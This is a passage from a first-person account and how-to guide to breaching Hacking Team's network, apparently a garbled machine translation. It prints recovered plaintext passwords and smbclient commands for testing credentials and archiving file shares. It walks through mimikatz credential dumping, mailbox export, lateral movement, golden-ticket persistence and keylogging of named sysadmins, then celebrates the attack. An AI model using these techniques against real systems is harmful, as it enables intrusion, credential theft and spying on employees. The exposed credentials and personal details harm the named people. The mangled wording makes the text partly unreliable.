What interests me most about the backup is to look if you have a
or hash password you can use to access the current server. Use pwdump,
cachedump, and lsadump [1] with the registry files. lsadump is the
password account besadmin service:

_SC_BlackBerry MDS Connection Service
0000 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0010 62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00 bes3.2.6.7.8.
0020 21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00!.!.! ...........

proxychains [2] use the SOCKS server and embedded system
smbclient [3] to check the password:
proxychains smbclient //192.168.100.51/c$ '-U' hackingteam.local / besadmin% bes32678 !!! '

!Works! Besadmin password is still valid, and is an administrator
local. I use my proxy and psexec_psh metasploit [4] for a session
of meterpreter. Then I migrate to a 64-bit process, "load kiwi" [5]
"Creds_wdigest", and I have many passwords, including the Administrator
domain:

- [11 - Downloading Post] ----------------------------------------- ------

Now that I have the password for the domain administrator, I have access to
mails, the heart of the company. Because with every step I take is a
risk of detection, I download mails before further exploring.
Powershell makes it easy [1]. Interestingly, I found a bug with handling
dates. After getting the mail, I took a couple of weeks in
get the source and other code, so I returned occasionally to
download new emails. The server was Italian, with the dates
day / month / year. Use:
-ContentFilter {(Received -ge '05 / 06/2015 ') -or (Sent -ge '05 / 06/2015')}

with the New-MailboxExportRequest to download new mail (in this
If all mail from June 5. The problem is that says
the date is invalid if the day is greater than 12 (I guess this is because
US that is the first month and month can not be greater than 12). Looks like
Microsoft engineers have only tested their software with their own
regional configuration.

- [12 - Downloading Files] ------------------------------------------ -------

Now I'm a domain administrator, I also began to download
shares using my proxy and -Tc smbclient option for
example:

proxychains smbclient //192.168.1.230/FAE DiskStation '\
-U 'HACKINGTEAM / Administrator% uu8dd8ndd12!' -TC FAE_DiskStation.tar '*'

So I downloaded the Amministrazione, FAE DiskStation, and FileServer folders
the torrent.


- [13 - Introduction to Hacking Windows Domain] -----------------------

Before continue telling the story of the Culiao Non-Windows, it should say something
knowledge to attack Windows networks.


---- [13.1 - Lateral Movement] ---------------------------------------- -------

I will give a brief overview of the techniques to spread within a network
Windows. Techniques to run remotely require the password or
hash of a local administrator on the target. By far the most common way
to get such credentials is to use mimikatz [1], especially
logonpasswords and sekurlsa sekurlsa :: :: mSv, on computers where you already have
administrative access. Movement techniques "in situ" also Require
administrative privileges (I except for runes). The more tools
important privilege escalation are PowerUp [2], and bypassuac [3].

[1] https://adsecurity.org/?page_id=1821
[2] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
[3] https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Invoke-BypassUAC.ps1


Remote movement:

1) psexec

The basic and proven way of moving windows networks. You can use
psexec [1], winexe [2], psexec_psh metasploit [3], invoke_psexec of
powershell empire [4], or the Windows command "sc" [5]. For module
metasploit, powershell empire, and pth-winexe [6], enough to know the hash
without knowing the password. It is the most universal way (works on any
computer with port 445 open), but also way less
cautious. It appears in the 7045 event log type "Service
Control Manager. "In my experience, they have never realized for a
hack, but sometimes you notice later and helps researchers understand
what has made the hacker.

2) WMI

more cautious way. WMI service is enabled on all
Windows computers, but except for servers, the firewall blocks it
default. You can use wmiexec.py [7] pth-WMIS [6] (here's a
wmiexec demonstration and pth-WMIS [8]), invoke_wmi empire powershell
[9], or the Windows command wmic [5]. All but need only wmic
hash.

3) PSRemoting [10]

It is disabled by default, and not advise enable new
protocols that are not needed. But if the sysadmin already enabled,
is very convenient, especially if you use powershell for all (and yes,
you should use powershell for almost everything will change [11] with powershell 5
and Windows 10, but now powershell day makes it easy to do everything in RAM,
dodge antivirus, and leave few traces).

4) Scheduled Tasks

You can run remote programs at and schtasks [5]. It works on the
psexec same situations, and also leaves traces known [12].

5) GPO

If all these protocols are disabled or blocked by
firewall, once you are the domain administrator, you can use GPO
to give a logon script, install a msi, run a scheduled task
[13], or as we shall see computer Mauro Romeo (sysadmin Hacking
Team), enable WMI and open the firewall via GPO.

Movement "in situ"

1) Impersonalizando Tokens

Once you have administrative access to a computer, you can use the
tokens of other users to access resources in the domain. Two
tools to do this are incognito [1] and commands token :: * of
mimikatz [2].

2) MS14-068

You can take advantage of a validation failure kerberos to generate a
ticket domain administrator [3] [4] [5].

3) Pass the Hash

If you have your hash but the user has not logged on you can use
sekurlsa :: pth [2] for a ticket user.

4) Injection Process

Any RAT can be injected to another process, for example the command
pupy migrate in meterpreter and [6] or psinject [7] in powershell empire.
You can inject the process with the token you want.

5) runes

This is sometimes very useful because it does not require privileges
administrator. The command is part of windows, but if you have no interface
Graphics can use powershell [8].

---- [13.2 - Persistence] ----------------------------------------- ------------

Having gained access, you want to keep. Indeed, the persistence
It's just a challenge for motherfuckers like they want Hacking Team
hack activists or other individuals. Companies to hack, it goes
persistence because companies never sleep. I always use "persistence"
Duqu style 2 run in RAM on a pair of servers with high
uptime percentages. In the unlikely event that all restarted at a time,
I have a ticket passwords and gold [1] to access booking. You can read
more information on persistence mechanisms for windows here
[2. 3. 4]. But to hack into companies, you do not need and increases the risk of
detection.

---- [13.3 - Internal Recognition] ---------------------------------------- ---

The best tool for understanding today Windows is Powerview networks [1].
Worth reading everything written by the author [2] above all [3], [4], [5] and
[6]. Powershell itself is also very powerful [7]. As there are still many
2003 and 2000 servers without powershell, you must also learn the old
school [8], with tools like netview.exe [9] or the command windows
"Net view". Other techniques that I like are:

1) Download a list of file names

With a domain administrator account, you can download all
file names on the network with powerview:

Invoke-ShareFinderThreaded -ExcludedShares IPC $, PRINT $, ADMIN $ |
select-string '^ (. *) \ t' | % {$ _ Matches -recurse dir [0] .Groups [1]. |
select fullname | files.txt -append out-file}

Later, you can read at your own pace and choose which ones you want to download.

2) Read post

As we have seen, you can be downloaded emails with powershell, and have
lots of useful information.

3) Read sharepoint

It is another place where many companies have important information. It can
download with powershell [10].

4) Active Directory [11]

It has lots of useful information about users and computers. Without being
domain administrator, and you can find lots of information
powerview and other tools [12]. After getting manager
domain should export all the information of AD with csvde or other
tool.

5) Spying on employees

One of my favorite pastimes is hunting the sysadmins. spying
Christan Pozzi (sysadmin Hacking Team) got the server accesso
Nagios gave me accessibility to sviluppo rete (network development in
RCS source code). With a simple combination of Get-Keystrokes and
Get-TimedScreenshot of PowerSploit [13], Do-Exfiltration of Nishang [14], and
GPO, you can spy on any employee or even the entire domain.

- [14 - Hunting Sysadmins] ------------------------------------------ ----------

By reading the documentation of its infrastructure [1], I realized that even I
lacked access to something important - "Rete Sviluppo" an isolated network
keeps all the RCS source code. Sysadmins of a company always
They have access to everything. I searched computers Mauro Romeo and Christian
Pozzi to see how they handle the network sviluppo, and to see if there were other
interesting systems should investigate. It was easy to access your
computers since they were part of the Windows domain that had
administrator. Mauro computer Romeo had no open port,
so I opened the port of WMI [2] to execute meterpreter [3]. In addition to
record catches with keys and Get-Keystrokes and Get-TimedScreenshot, used many
modules / gather / metasploit, CredMan.ps1 [4], and searched files [5]. seeing
that Pozzi had a Truecrypt volume, I waited until he had assembled to
then copy the files. Many have laughed weak passwords
Christian Pozzi (Christian Pozzi and generally provides enough material
for comedy [6] [7] [8] [9]). I included them in filtration as an oversight and
to laugh at him. The reality is that mimikatz and keyloggers see all
same passwords.

- [15 - The Bridge] ------------------------------------------ ------------------

Within the volume encryption Christian Pozzi, there was a textfile with many
passwords [1]. One was for a Nagios server Fully Automated,
I had access to sviluppo network to monitor it. Had found
the bridge. Only had the password for the Web interface, but there was a
Public exploit [2] to execute code and get a shell (is an exploit
unauthenticated, but it takes a user has logged in to the
I used that password textfile).

- [16 - Reusing and restoring passwords] ----------------------------

Reading the post, he had seen Milan Daniele granting access to
git repositories. And I had its windows password by mimikatz. The
I tried with git server and it worked. I tried sudo and it worked. For him
gitlab server and your twitter account, I used the "I forgot my
Password "and my access to the mail server to restore
password.


- [17 - Conclusion] ------------------------------------------- ----------------

It is done. So easy it is to tear down a company and stop their abuses
human rights. That is the beauty and the asymmetry of hacking: with only a hundred
hours of work, one person can undo years of work of a
multimillion-dollar company. The hacking gives us the possibility of the dispossessed
fight and win.

Hacking guides often end with a warning: This information is
only for educational purposes, I am an ethical hacker, not attacks on computers without
permission, gobbledygook. I will say the same, but with a more rebellious concept
hacking "ethical". Filter ethical hacking documents would expropriate money
banks, and protect computers of ordinary people. However, the
Most people who call themselves "ethical hackers" work only
to protect those who pay their consulting fee, which often are the
they most deserve to be hacked.

Hacking Team is see themselves as part of a tradition of inspiring
Italian [1] design. I see them Vincenzetti, your company, and their cronies
police, police, and government, as part of a long tradition of
Italian fascism. I want to dedicate this guide to the victims of the assault on the
Armando Diaz school, and all those who have shed their blood on hands
Italian fascists.
